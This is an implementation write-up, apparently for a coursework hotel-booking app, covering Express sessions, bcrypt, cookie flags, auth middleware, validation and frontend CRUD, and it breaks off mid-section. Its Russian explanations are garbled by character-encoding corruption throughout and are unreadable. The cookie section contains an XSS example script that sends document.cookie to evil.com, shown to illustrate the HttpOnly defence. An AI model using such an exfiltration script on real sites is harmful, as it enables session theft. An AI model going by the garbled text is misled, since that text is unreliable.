# рџЋЇ IMPLEMENTATION EXPLANATION - Technical Overview

## Р”РµС‚Р°Р»СЊРЅРѕРµ РѕР±СЉСЏСЃРЅРµРЅРёРµ СЂРµР°Р»РёР·РѕРІР°РЅРЅРѕРіРѕ С„СѓРЅРєС†РёРѕРЅР°Р»Р°

---

## 1. рџ”ђ Session-Based Authentication

### Р§С‚Рѕ СЂРµР°Р»РёР·РѕРІР°РЅРѕ:

#### РљРѕРЅС„РёРіСѓСЂР°С†РёСЏ СЃРµСЃСЃРёР№ (server.js, СЃС‚СЂРѕРєРё 23-40)
```javascript
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  store: MongoStore.create({
    mongoUrl: process.env.MONGO_URI,
    dbName: 'assignment3',
    collectionName: 'sessions',
    ttl: 24 * 60 * 60
  }),
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    maxAge: 24 * 60 * 60 * 1000,
    sameSite: 'strict'
  },
  name: 'sessionId'
}));
```

**Р›РѕРіРёРєР° СЂР°Р±РѕС‚С‹:**
1. `secret` - СЃРµРєСЂРµС‚РЅС‹Р№ РєР»СЋС‡ РґР»СЏ РїРѕРґРїРёСЃРё session ID (Р·Р°С‰РёС‚Р° РѕС‚ РїРѕРґРґРµР»РєРё)
2. `resave: false` - РЅРµ СЃРѕС…СЂР°РЅСЏС‚СЊ СЃРµСЃСЃРёСЋ РµСЃР»Рё РѕРЅР° РЅРµ РёР·РјРµРЅРёР»Р°СЃСЊ (РѕРїС‚РёРјРёР·Р°С†РёСЏ)
3. `saveUninitialized: false` - РЅРµ СЃРѕР·РґР°РІР°С‚СЊ СЃРµСЃСЃРёСЋ РґР»СЏ РЅРµР°РІС‚РѕСЂРёР·РѕРІР°РЅРЅС‹С… (Р±РµР·РѕРїР°СЃРЅРѕСЃС‚СЊ)
4. `MongoStore.create()` - С…СЂР°РЅРµРЅРёРµ СЃРµСЃСЃРёР№ РІ MongoDB (РјР°СЃС€С‚Р°Р±РёСЂСѓРµРјРѕСЃС‚СЊ)
5. `ttl: 24 * 60 * 60` - РІСЂРµРјСЏ Р¶РёР·РЅРё СЃРµСЃСЃРёРё 24 С‡Р°СЃР°
6. `httpOnly: true` - cookie РЅРµРґРѕСЃС‚СѓРїРµРЅ РґР»СЏ JavaScript (Р·Р°С‰РёС‚Р° РѕС‚ XSS)
7. `secure: true` - cookie С‚РѕР»СЊРєРѕ С‡РµСЂРµР· HTTPS РІ РїСЂРѕРґР°РєС€РµРЅРµ
8. `sameSite: 'strict'` - Р·Р°С‰РёС‚Р° РѕС‚ CSRF Р°С‚Р°Рє

### РџСЂРѕС†РµСЃСЃ Р°СѓС‚РµРЅС‚РёС„РёРєР°С†РёРё (server.js, СЃС‚СЂРѕРєРё 231-278)

```javascript
app.post('/admin/login', async (req, res) => {
  const { username, password } = req.body;
  
  // 1. Р’Р°Р»РёРґР°С†РёСЏ РІС…РѕРґРЅС‹С… РґР°РЅРЅС‹С…
  if (!username || !password) {
    return res.status(400).json({ error: 'Username and password are required' });
  }
  
  // 2. РџРѕРёСЃРє РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ РІ Р‘Р”
  const db = await connectDB();
  const user = await db.collection('users').findOne({ username });
  
  // 3. РџСЂРѕРІРµСЂРєР° СЃСѓС‰РµСЃС‚РІРѕРІР°РЅРёСЏ (РѕР±С‰РµРµ СЃРѕРѕР±С‰РµРЅРёРµ РѕР± РѕС€РёР±РєРµ)
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // 4. РџСЂРѕРІРµСЂРєР° РїР°СЂРѕР»СЏ С‡РµСЂРµР· bcrypt
  const passwordMatch = await bcrypt.compare(password, user.password);
  
  if (!passwordMatch) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
  
  // 5. РЎРѕР·РґР°РЅРёРµ СЃРµСЃСЃРёРё (Р‘Р•Р— РїР°СЂРѕР»СЏ!)
  req.session.user = {
    id: user._id.toString(),
    username: user.username,
    role: user.role,
    email: user.email,
    fullName: user.fullName
  };
  
  // 6. РЎРѕС…СЂР°РЅРµРЅРёРµ СЃРµСЃСЃРёРё РІ MongoDB
  req.session.save((err) => {
    if (err) {
      return res.status(500).json({ error: 'Session error' });
    }
    res.status(200).json({ 
      success: true, 
      user: { username, role, fullName }
    });
  });
});
```

**РџРѕС‡РµРјСѓ СЌС‚Рѕ Р±РµР·РѕРїР°СЃРЅРѕ:**
- вњ… РџР°СЂРѕР»Рё РїСЂРѕРІРµСЂСЏСЋС‚СЃСЏ С‡РµСЂРµР· bcrypt (РЅРµРѕР±СЂР°С‚РёРјРѕРµ С…РµС€РёСЂРѕРІР°РЅРёРµ)
- вњ… РЎРµСЃСЃРёСЏ РќР• СЃРѕРґРµСЂР¶РёС‚ РїР°СЂРѕР»СЊ
- вњ… РћР±С‰РёРµ СЃРѕРѕР±С‰РµРЅРёСЏ РѕР± РѕС€РёР±РєР°С… (РЅРµРІРѕР·РјРѕР¶РЅРѕ СѓР·РЅР°С‚СЊ, С‡С‚Рѕ РёРјРµРЅРЅРѕ РЅРµРІРµСЂРЅРѕ)
- вњ… Session ID Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё РіРµРЅРµСЂРёСЂСѓРµС‚СЃСЏ Express
- вњ… Cookie СЃ HttpOnly С„Р»Р°РіРѕРј (JavaScript РЅРµ РјРѕР¶РµС‚ СѓРєСЂР°СЃС‚СЊ)

---

## 2. рџ”’ Bcrypt Password Hashing

### РРЅРёС†РёР°Р»РёР·Р°С†РёСЏ РїРѕР»СЊР·РѕРІР°С‚РµР»РµР№ (init-users.js)

```javascript
const bcrypt = require('bcrypt');

// РЎРѕР·РґР°РЅРёРµ С…РµС€Р° СЃ СЃРѕР»СЊСЋ (10 СЂР°СѓРЅРґРѕРІ)
const adminPassword = await bcrypt.hash('REDACTED_ADMIN_PASSWORD', 10);

// РЎРѕС…СЂР°РЅРµРЅРёРµ РўРћР›Р¬РљРћ С…РµС€Р° РІ Р‘Р”
await usersCollection.insertOne({
  username: 'admin',
  password: adminPassword,  // $2b$10$N9qo8uLOickgx2ZMRZoMye...
  role: 'admin',
  email: 'admin@comforthoetel.com',
  fullName: 'Administrator'
});
```

**Р§С‚Рѕ С‚Р°РєРѕРµ bcrypt:**
- РђР»РіРѕСЂРёС‚Рј РЅРµРѕР±СЂР°С‚РёРјРѕРіРѕ С…РµС€РёСЂРѕРІР°РЅРёСЏ
- РљР°Р¶РґС‹Р№ С…РµС€ СЃРѕРґРµСЂР¶РёС‚ СѓРЅРёРєР°Р»СЊРЅСѓСЋ СЃРѕР»СЊ (Р·Р°С‰РёС‚Р° РѕС‚ rainbow tables)
- 10 СЂР°СѓРЅРґРѕРІ = 2^10 РёС‚РµСЂР°С†РёР№ (РјРµРґР»РµРЅРЅРѕ РґР»СЏ Р±СЂСѓС‚С„РѕСЂСЃР°)

**РџСЂРёРјРµСЂ С…РµС€Р°:**
```
Input:  "REDACTED_ADMIN_PASSWORD"
Output: "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
         в””в”Ђв” в””в” в””в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв” в””в”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”Ђв”
          в”‚   в”‚        в”‚                      в”‚
      РђР»РіРѕСЂРёС‚Рј в”‚     РЎРѕР»СЊ                   РҐРµС€
           Р Р°СѓРЅРґС‹
```

### РџСЂРѕРІРµСЂРєР° РїР°СЂРѕР»СЏ РїСЂРё Р»РѕРіРёРЅРµ

```javascript
// РџРѕР»СЊР·РѕРІР°С‚РµР»СЊ РІРІРѕРґРёС‚: "REDACTED_ADMIN_PASSWORD"
const inputPassword = req.body.password;

// РР· Р‘Р” РїРѕР»СѓС‡Р°РµРј С…РµС€: "$2b$10$N9qo8uLO..."
const storedHash = user.password;

// bcrypt СЃСЂР°РІРЅРёРІР°РµС‚, РІРѕСЃСЃС‚Р°РЅР°РІР»РёРІР°СЏ СЃРѕР»СЊ РёР· С…РµС€Р°
const isValid = await bcrypt.compare(inputPassword, storedHash);
// true РµСЃР»Рё СЃРѕРІРїР°РґР°РµС‚, false РµСЃР»Рё РЅРµС‚
```

**РџРѕС‡РµРјСѓ СЌС‚Рѕ Р±РµР·РѕРїР°СЃРЅРѕ:**
- вњ… РќРµРІРѕР·РјРѕР¶РЅРѕ РІРѕСЃСЃС‚Р°РЅРѕРІРёС‚СЊ РѕСЂРёРіРёРЅР°Р»СЊРЅС‹Р№ РїР°СЂРѕР»СЊ РёР· С…РµС€Р°
- вњ… РљР°Р¶РґС‹Р№ РїР°СЂРѕР»СЊ РёРјРµРµС‚ СѓРЅРёРєР°Р»СЊРЅСѓСЋ СЃРѕР»СЊ
- вњ… Р‘СЂСѓС‚С„РѕСЂСЃ Р·Р°Р№РјРµС‚ РіРѕРґС‹ РёР·-Р·Р° РјРµРґР»РµРЅРЅРѕРіРѕ Р°Р»РіРѕСЂРёС‚РјР°
- вњ… Р”Р°Р¶Рµ РѕРґРёРЅР°РєРѕРІС‹Рµ РїР°СЂРѕР»Рё РёРјРµСЋС‚ СЂР°Р·РЅС‹Рµ С…РµС€Рё

---

## 3. рџЌЄ Cookie Security

### HttpOnly Flag

**РљРѕРґ РІ server.js:**
```javascript
cookie: {
  httpOnly: true  // РљР РРўРР§РќРћ!
}
```

**Р§С‚Рѕ СЌС‚Рѕ РґР°РµС‚:**
```javascript
// Р’ Р±СЂР°СѓР·РµСЂРµ:
document.cookie; // ""  (РїСѓСЃС‚Рѕ!)

// Cookie СЃСѓС‰РµСЃС‚РІСѓРµС‚, РЅРѕ JavaScript РµРіРѕ РЅРµ РІРёРґРёС‚
// Р‘СЂР°СѓР·РµСЂ Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё РѕС‚РїСЂР°РІР»СЏРµС‚ cookie СЃ Р·Р°РїСЂРѕСЃР°РјРё
// РќРѕ РІСЂРµРґРѕРЅРѕСЃРЅС‹Р№ СЃРєСЂРёРїС‚ РќР• РњРћР–Р•Рў РµРіРѕ СѓРєСЂР°СЃС‚СЊ
```

**Р—Р°С‰РёС‚Р° РѕС‚ XSS Р°С‚Р°РєРё:**
```html
<!-- Р—Р»РѕСѓРјС‹С€Р»РµРЅРЅРёРє РІРЅРµРґСЂСЏРµС‚ СЃРєСЂРёРїС‚ -->
<script>
  // РџРѕРїС‹С‚РєР° СѓРєСЂР°СЃС‚СЊ cookie
  fetch('http://evil.com/steal?cookie=' + document.cookie);
  // РќР• РЎР РђР‘РћРўРђР•Рў! document.cookie РїСѓСЃС‚ РёР·-Р·Р° HttpOnly
</script>
```

### Secure Flag

**РљРѕРґ:**
```javascript
cookie: {
  secure: process.env.NODE_ENV === 'production'
}
```

**Р§С‚Рѕ СЌС‚Рѕ РґР°РµС‚:**
- Development (HTTP): `secure: false` - cookie РѕС‚РїСЂР°РІР»СЏРµС‚СЃСЏ
- Production (HTTPS): `secure: true` - cookie РўРћР›Р¬РљРћ С‡РµСЂРµР· HTTPS

**Р—Р°С‰РёС‚Р° РѕС‚ Man-in-the-Middle:**
```
Р‘РµР· Secure:
User в†’ HTTP в†’ [Attacker РїРµСЂРµС…РІР°С‚С‹РІР°РµС‚] в†’ Server
                в†“
           РЈРєСЂР°РґРµРЅ session cookie

РЎ Secure:
User в†’ HTTPS в†’ [Р—Р°С€РёС„СЂРѕРІР°РЅРѕ] в†’ Server
                в†“
         Attacker РЅРёС‡РµРіРѕ РЅРµ РІРёРґРёС‚
```

### SameSite Flag

**РљРѕРґ:**
```javascript
cookie: {
  sameSite: 'strict'
}
```

**Р—Р°С‰РёС‚Р° РѕС‚ CSRF:**
```
Р‘РµР· SameSite:
1. User Р·Р°Р»РѕРіРёРЅРµРЅ РЅР° bank.com
2. Attacker С€Р»РµС‚ СЃСЃС‹Р»РєСѓ: evil.com
3. РќР° evil.com СЃРєСЂРёРїС‚ РґРµР»Р°РµС‚ Р·Р°РїСЂРѕСЃ Рє bank.com
4. Р‘СЂР°СѓР·РµСЂ РѕС‚РїСЂР°РІР»СЏРµС‚ cookie РѕС‚ bank.com
5. Р—Р°РїСЂРѕСЃ РІС‹РїРѕР»РЅСЏРµС‚СЃСЏ РѕС‚ РёРјРµРЅРё РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ!

РЎ SameSite='strict':
1-3. РўРѕ Р¶Рµ СЃР°РјРѕРµ
4. Р‘СЂР°СѓР·РµСЂ РќР• РѕС‚РїСЂР°РІР»СЏРµС‚ cookie РґР»СЏ cross-site Р·Р°РїСЂРѕСЃР°
5. Р—Р°РїСЂРѕСЃ РѕС‚РєР»РѕРЅРµРЅ (401 Unauthorized)
```

---

## 4. рџ›ЎпёЏ Authentication Middleware

### Middleware С„СѓРЅРєС†РёСЏ (server.js, СЃС‚СЂРѕРєРё 57-75)

```javascript
function isAuthenticated(req, res, next) {
  // РџСЂРѕРІРµСЂСЏРµРј РЅР°Р»РёС‡РёРµ СЃРµСЃСЃРёРё Рё РґР°РЅРЅС‹С… РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ
  if (req.session && req.session.user) {
    return next();  // РџСЂРѕРґРѕР»Р¶РёС‚СЊ РѕР±СЂР°Р±РѕС‚РєСѓ
  }
  
  // Р”Р»СЏ API РІРѕР·РІСЂР°С‰Р°РµРј JSON РѕС€РёР±РєСѓ
  if (req.path.startsWith('/api/')) {
    return res.status(401).json({ 
      error: 'Authentication required',
      message: 'Please log in to perform this action'
    });
  }
  
  // Р”Р»СЏ РѕР±С‹С‡РЅС‹С… Р·Р°РїСЂРѕСЃРѕРІ - СЂРµРґРёСЂРµРєС‚ РЅР° Р»РѕРіРёРЅ
  res.redirect('/admin?error=Please login first');
}
```

**РљР°Рє СЌС‚Рѕ СЂР°Р±РѕС‚Р°РµС‚:**

```javascript
// Р—Р°С‰РёС‰РµРЅРЅС‹Р№ endpoint
app.post('/api/bookings', isAuthenticated, async (req, res) => {
  // Р­С‚Р° С„СѓРЅРєС†РёСЏ РІС‹РїРѕР»РЅРёС‚СЃСЏ РўРћР›Р¬РљРћ РµСЃР»Рё isAuthenticated() РІС‹Р·РІР°Р» next()
  // РўРѕ РµСЃС‚СЊ РўРћР›Р¬РљРћ РµСЃР»Рё РїРѕР»СЊР·РѕРІР°С‚РµР»СЊ Р·Р°Р»РѕРіРёРЅРµРЅ
});

// РџРѕС‚РѕРє РІС‹РїРѕР»РЅРµРЅРёСЏ:
// 1. Р—Р°РїСЂРѕСЃ РїСЂРёС…РѕРґРёС‚ РЅР° /api/bookings
// 2. Express РІС‹Р·С‹РІР°РµС‚ isAuthenticated()
// 3a. Р•СЃР»Рё СЃРµСЃСЃРёСЏ РµСЃС‚СЊ в†’ next() в†’ РІС‹РїРѕР»РЅСЏРµС‚СЃСЏ РѕР±СЂР°Р±РѕС‚С‡РёРє
// 3b. Р•СЃР»Рё СЃРµСЃСЃРёРё РЅРµС‚ в†’ 401 в†’ РѕР±СЂР°Р±РѕС‚С‡РёРє РќР• РІС‹РїРѕР»РЅСЏРµС‚СЃСЏ
```

### РџСЂРёРјРµРЅРµРЅРёРµ middleware (server.js)

```javascript
// вќЊ РќР• Р·Р°С‰РёС‰РµРЅРѕ - Р»СЋР±РѕР№ РјРѕР¶РµС‚ С‡РёС‚Р°С‚СЊ
app.get('/api/bookings', async (req, res) => {
  // РџРѕР»СѓС‡РёС‚СЊ СЃРїРёСЃРѕРє Р±СЂРѕРЅРёСЂРѕРІР°РЅРёР№
});

// вњ… Р—РђР©РР©Р•РќРћ - С‚РѕР»СЊРєРѕ Р°РІС‚РѕСЂРёР·РѕРІР°РЅРЅС‹Рµ
app.post('/api/bookings', isAuthenticated, async (req, res) => {
  // РЎРѕР·РґР°С‚СЊ Р±СЂРѕРЅРёСЂРѕРІР°РЅРёРµ
});

app.put('/api/bookings/:id', isAuthenticated, async (req, res) => {
  // РћР±РЅРѕРІРёС‚СЊ Р±СЂРѕРЅРёСЂРѕРІР°РЅРёРµ
});

app.delete('/api/bookings/:id', isAuthenticated, async (req, res) => {
  // РЈРґР°Р»РёС‚СЊ Р±СЂРѕРЅРёСЂРѕРІР°РЅРёРµ
});
```

**РџРѕС‡РµРјСѓ READ РЅРµ Р·Р°С‰РёС‰РµРЅ:**
- РџСЂРѕСЃРјРѕС‚СЂ РґРѕСЃС‚СѓРїРµРЅ РґР»СЏ РґРµРјРѕРЅСЃС‚СЂР°С†РёРё
- Write РѕРїРµСЂР°С†РёРё (CREATE, UPDATE, DELETE) С‚СЂРµР±СѓСЋС‚ Р°РІС‚РѕСЂРёР·Р°С†РёРё
- РЎРѕРѕС‚РІРµС‚СЃС‚РІСѓРµС‚ С‚СЂРµР±РѕРІР°РЅРёСЏРј Р·Р°РґР°РЅРёСЏ

---

## 5. вњ”пёЏ Validation & Error Handling

### Email РІР°Р»РёРґР°С†РёСЏ

```javascript
function isValidEmail(email) {
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  return emailRegex.test(email);
}

// РСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ:
if (!isValidEmail(guestEmail)) {
  return res.status(400).json({ error: 'Invalid email format' });
}
```

**Regex РѕР±СЉСЏСЃРЅРµРЅРёРµ:**
- `^` - РЅР°С‡Р°Р»Рѕ СЃС‚СЂРѕРєРё
- `[^\s@]+` - РѕРґРёРЅ РёР»Рё Р±РѕР»РµРµ СЃРёРјРІРѕР»РѕРІ (РЅРµ РїСЂРѕР±РµР»С‹, РЅРµ @)
- `@` - СЃРёРјРІРѕР» @
- `[^\s@]+` - РґРѕРјРµРЅ
- `\.` - С‚РѕС‡РєР°
- `[^\s@]+` - РґРѕРјРµРЅРЅР°СЏ Р·РѕРЅР°
- `$` - РєРѕРЅРµС† СЃС‚СЂРѕРєРё

**РџСЂРёРјРµСЂС‹:**
- вњ… `john@example.com`
- вњ… `user.name@domain.co.uk`
- вќЊ `invalid.email`
- вќЊ `@example.com`
- вќЊ `user@`

### Date РІР°Р»РёРґР°С†РёСЏ

```javascript
function validateBookingDates(checkIn, checkOut) {
  const checkInDate = new Date(checkIn);
  const checkOutDate = new Date(checkOut);
  const today = new Date();
  today.setHours(0, 0, 0, 0);
  
  // РџСЂРѕРІРµСЂРєР° 1: Р”Р°С‚Р° Р·Р°РµР·РґР° РЅРµ РІ РїСЂРѕС€Р»РѕРј
  if (checkInDate < today) {
    return { valid: false, error: 'Check-in date cannot be in the past' };
  }
  
  // РџСЂРѕРІРµСЂРєР° 2: Р”Р°С‚Р° РІС‹РµР·РґР° РїРѕСЃР»Рµ Р·Р°РµР·РґР°
  if (checkOutDate <= checkInDate) {
    return { valid: false, error: 'Check-out date must be after check-in date' };
  }
  
  return { valid: true };
}
```

**Р›РѕРіРёРєР°:**
1. РљРѕРЅРІРµСЂС‚РёСЂСѓРµРј СЃС‚СЂРѕРєРё РІ Date РѕР±СЉРµРєС‚С‹
2. РЎР±СЂР°СЃС‹РІР°РµРј РІСЂРµРјСЏ Сѓ "СЃРµРіРѕРґРЅСЏ" РґР»СЏ РєРѕСЂСЂРµРєС‚РЅРѕРіРѕ СЃСЂР°РІРЅРµРЅРёСЏ
3. РџСЂРѕРІРµСЂСЏРµРј Р»РѕРіРёРєСѓ РґР°С‚
4. Р’РѕР·РІСЂР°С‰Р°РµРј РѕР±СЉРµРєС‚ СЃ СЂРµР·СѓР»СЊС‚Р°С‚РѕРј

### HTTP Status Codes

```javascript
// 200 OK - РЈСЃРїРµС€РЅРѕРµ С‡С‚РµРЅРёРµ/РѕР±РЅРѕРІР»РµРЅРёРµ
res.status(200).json(booking);

// 201 Created - РЈСЃРїРµС€РЅРѕРµ СЃРѕР·РґР°РЅРёРµ
res.status(201).json({ message: 'Created', id: result.insertedId });

// 400 Bad Request - РќРµРІР°Р»РёРґРЅС‹Рµ РґР°РЅРЅС‹Рµ
res.status(400).json({ error: 'Missing required fields' });

// 401 Unauthorized - РќРµ Р·Р°Р»РѕРіРёРЅРµРЅ
res.status(401).json({ error: 'Authentication required' });

// 403 Forbidden - РќРµС‚ РїСЂР°РІ
res.status(403).json({ error: 'Admin privileges required' });

// 404 Not Found - Р РµСЃСѓСЂСЃ РЅРµ РЅР°Р№РґРµРЅ
res.status(404).json({ error: 'Booking not found' });

// 500 Internal Server Error - РћС€РёР±РєР° СЃРµСЂРІРµСЂР°
res.status(500).json({ error: 'Database error' });
```

### Error handling РґР»СЏ MongoDB РѕРїРµСЂР°С†РёР№

```javascript
app.post('/api/bookings', isAuthenticated, async (req, res) => {
  try {
    // Р’Р°Р»РёРґР°С†РёСЏ РџР•Р Р•Р” РѕР±СЂР°С‰РµРЅРёРµРј Рє Р‘Р”
    if (!roomName || !guestEmail) {
      return res.status(400).json({ error: 'Missing fields' });
    }
    
    if (!isValidEmail(guestEmail)) {
      return res.status(400).json({ error: 'Invalid email' });
    }
    
    // РћРїРµСЂР°С†РёСЏ СЃ Р‘Р” РІ try-catch
    const db = await connectDB();
    const result = await db.collection('bookings').insertOne(data);
    
    res.status(201).json({ message: 'Success', id: result.insertedId });
    
  } catch (error) {
    // Р›РѕРіРёСЂРѕРІР°РЅРёРµ РґР»СЏ РѕС‚Р»Р°РґРєРё
    console.error('Database error:', error);
    
    // РћР±С‰РµРµ СЃРѕРѕР±С‰РµРЅРёРµ РґР»СЏ РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ (Р±РµР·РѕРїР°СЃРЅРѕСЃС‚СЊ)
    res.status(500).json({ error: 'Database error' });
  }
});
```

**Р’Р°Р¶РЅРѕ:**
- вњ… Р’СЃРµРіРґР° РІР°Р»РёРґРёСЂСѓРµРј РџР•Р Р•Р” РѕР±СЂР°С‰РµРЅРёРµРј Рє Р‘Р”
- вњ… Р’СЃРµРіРґР° РёСЃРїРѕР»СЊР·СѓРµРј try-catch РґР»СЏ async РѕРїРµСЂР°С†РёР№
- вњ… Р›РѕРіРёСЂСѓРµРј РґРµС‚Р°Р»Рё РѕС€РёР±РєРё РґР»СЏ СЂР°Р·СЂР°Р±РѕС‚С‡РёРєР°
- вњ… РћС‚РїСЂР°РІР»СЏРµРј РѕР±С‰РµРµ СЃРѕРѕР±С‰РµРЅРёРµ РїРѕР»СЊР·РѕРІР°С‚РµР»СЋ

---

## 6. рџЋЁ Frontend CRUD Implementation

### Р—Р°РіСЂСѓР·РєР° РґР°РЅРЅС‹С… (admin-dashboard.html)

```javascript
async function loadBookings() {
  try {
    const response = await fetch('/api/bookings');
    allBookings = await response.json();
    
    updateStatistics();
    displayBookings(allBookings);
  } catch (error) {
    console.error('Error loading bookings:', error);
    // РџРѕРєР°Р·Р°С‚СЊ СЃРѕРѕР±С‰РµРЅРёРµ РѕР± РѕС€РёР±РєРµ
  }
}
```

### CREATE РѕРїРµСЂР°С†РёСЏ

```javascript
async function saveBooking() {
  // Р’Р°Р»РёРґР°С†РёСЏ С„РѕСЂРјС‹
  const form = document.getElementById('bookingForm');
  if (!form.checkValidity()) {
    form.reportValidity();
    return;
  }
  
  // РЎР±РѕСЂ РґР°РЅРЅС‹С…
  const data = {
    roomName: document.getElementById('roomName').value,
    guestEmail: document.getElementById('guestEmail').value,
    // ... РѕСЃС‚Р°Р»СЊРЅС‹Рµ РїРѕР»СЏ
  };
  
  try {
    const response = await fetch('/api/bookings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(data)
    });
    
    const result = await response.json();
    
    if (response.ok) {
      // Р—Р°РєСЂС‹С‚СЊ РјРѕРґР°Р»
      bootstrap.Modal.getInstance(modal).hide();
      // РџРµСЂРµР·Р°РіСЂСѓР·РёС‚СЊ РґР°РЅРЅС‹Рµ
      await loadBookings();
      alert('Booking created successfully!');
    } else {
      alert('Error: ' + result.error);
    }
  } catch (error) {
    alert('Network error');
  }
}
```

### UPDATE РѕРїРµСЂР°С†РёСЏ

```javascript
async function saveBooking() {
  const bookingId = document.getElementById('bookingId').value;
  const data = { /* СЃРѕР±СЂР°РЅРЅС‹Рµ РґР°РЅРЅС‹Рµ */ };
  
  // Р•СЃР»Рё РµСЃС‚СЊ ID - UPDATE, РёРЅР°С‡Рµ CREATE
  const url = bookingId ? `/api/bookings/${bookingId}` : '/api/bookings';
  const method = bookingId ? 'PUT' : 'POST';
  
  const response = await fetch(url, {
    method: method,
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
  
  // РћР±СЂР°Р±РѕС‚РєР° РѕС‚РІРµС‚Р°
}
```

### DELETE РѕРїРµСЂР°С†РёСЏ

```javascript
async function deleteBooking(id) {
  // РџРѕРґС‚РІРµСЂР¶РґРµРЅРёРµ
  if (!confirm('Are you sure?')) {
    return;
  }
  
  try {
    const response = await fetch(`/api/bookings/${id}`, {
      method: 'DELETE'
    });
    
    if (response.ok) {
      await loadBookings();  // РћР±РЅРѕРІРёС‚СЊ СЃРїРёСЃРѕРє
      alert('Deleted successfully!');
    } else {
      const result = await response.json();
      alert('Error: ' + result.error);
    }
  } catch (error) {
    alert('Network error');
  }
}
```

### РџСЂРѕРІРµСЂРєР° Р°РІС‚РѕСЂРёР·Р°С†РёРё РЅР° С„СЂРѕРЅС‚РµРЅРґРµ

```javascript
async function checkAuth() {
  try {
    const response = await fetch('/api/auth/status');
    const data = await response.json();
    
    if (!data.authenticated) {
      // Р РµРґРёСЂРµРєС‚ РЅР° Р»РѕРіРёРЅ
      window.location.href = '/admin?error=Please login first';
      return false;
    }
    
    // РџРѕРєР°Р·Р°С‚СЊ РёРјСЏ РїРѕР»СЊР·РѕРІР°С‚РµР»СЏ
    currentUser = data.user;
    document.getElementById('userDisplay').textContent = data.user.fullName;
    return true;
  } catch (error) {
    console.error('Auth check failed:', error);
    window.location.href = '/admin';
    return false;
  }
}

// РџСЂРѕРІРµСЂРєР° РїСЂРё Р·Р°РіСЂСѓР·РєРµ СЃС‚СЂР°РЅРёС†С‹
document.addEventListener('DOMContentLoaded', async function() {
  const isAuth = await checkAuth();
  if (isAuth) {
    await loadBookings();
  }
});
```

---

## 7. рџ“Љ Database Design

### Bookings Collection Schema

```javascript
{
  _id: ObjectId("65f1a2b3c4d5e6f7g8h9i0j1"),
  
  // РРЅС„РѕСЂРјР°С†РёСЏ Рѕ РєРѕРјРЅР°С‚Рµ
  roomName: "Deluxe Suite",
  roomType: "suite",
  
  // РРЅС„РѕСЂРјР°С†РёСЏ Рѕ РіРѕСЃС‚Рµ
  guestName: "John Smith",
  guestEmail: "john@example.com",
  guestPhone: "+1-555-123-4567",
  
  // Р”Р°С‚С‹ Р±СЂРѕРЅРёСЂРѕРІР°РЅРёСЏ
  checkInDate: ISODate("2026-03-15T00:00:00.000Z"),
  checkOutDate: ISODate("2026-03-18T00:00:00.000Z"),
  duration: 3,  // РђРІС‚РѕРјР°С‚РёС‡РµСЃРєРё СЂР°СЃСЃС‡РёС‚Р°РЅРѕ
  
  // Р”РµС‚Р°Р»Рё Р±СЂРѕРЅРёСЂРѕРІР°РЅРёСЏ
  numberOfGuests: 2,
  totalPrice: 750.00,
  specialRequests: "Late check-in requested",
  
  // РЎС‚Р°С‚СѓСЃ Рё РјРµС‚Р°РґР°РЅРЅС‹Рµ
  status: "confirmed",
  created_at: ISODate("2026-02-01T10:30:00.000Z"),
  created_by: "admin",
  updated_at: ISODate("2026-02-02T14:20:00.000Z"),
  updated_by: "admin"
}
```

### Indexes РґР»СЏ РѕРїС‚РёРјРёР·Р°С†РёРё

```javascript
// РђРІС‚РѕРјР°С‚РёС‡РµСЃРєРё СЃРѕР·РґР°РІР°РµРјС‹Рµ MongoDB РёРЅРґРµРєСЃС‹:
db.bookings.createIndex({ guestEmail: 1 });     // РџРѕРёСЃРє РїРѕ email
db.bookings.createIndex({ status: 1 });         // Р¤РёР»СЊС‚СЂ РїРѕ СЃС‚Р°С‚СѓСЃСѓ
db.bookings.createIndex({ checkInDate: -1 });   // РЎРѕСЂС‚РёСЂРѕРІРєР° РїРѕ РґР°С‚Рµ
```

---

## 8. рџљЂ Performance & Security Best Practices

### Connection Pooling (database/mongo.js)

```javascript
let db;

async function connectDB() {
  if (!db) {
    await client.connect();
    db = client.db('assignment3');
  }
  return db;
}
```

**РџРѕС‡РµРјСѓ СЌС‚Рѕ РІР°Р¶РЅРѕ:**
- РџРµСЂРµРёСЃРїРѕР»СЊР·РѕРІР°РЅРёРµ РѕРґРЅРѕРіРѕ РїРѕРґРєР»СЋС‡РµРЅРёСЏ
- РР·Р±РµРіР°РµРј РѕС‚РєСЂС‹С‚РёСЏ РЅРѕРІРѕРіРѕ РїРѕРґРєР»СЋС‡РµРЅРёСЏ РЅР° РєР°Р¶РґС‹Р№ Р·Р°РїСЂРѕСЃ
- MongoDB РґСЂР°Р№РІРµСЂ Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё СѓРїСЂР°РІР»СЏРµС‚ РїСѓР»РѕРј РїРѕРґРєР»СЋС‡РµРЅРёР№

### Input Sanitization

```javascript
// РћС‡РёСЃС‚РєР° Рё РЅРѕСЂРјР°Р»РёР·Р°С†РёСЏ РґР°РЅРЅС‹С…
const cleanData = {
  guestName: guestName.trim(),
  guestEmail: guestEmail.trim().toLowerCase(),
  // ...
};
```

### Generic Error Messages

```javascript
// вќЊ РџР›РћРҐРћ - СѓС‚РµС‡РєР° РёРЅС„РѕСЂРјР°С†РёРё
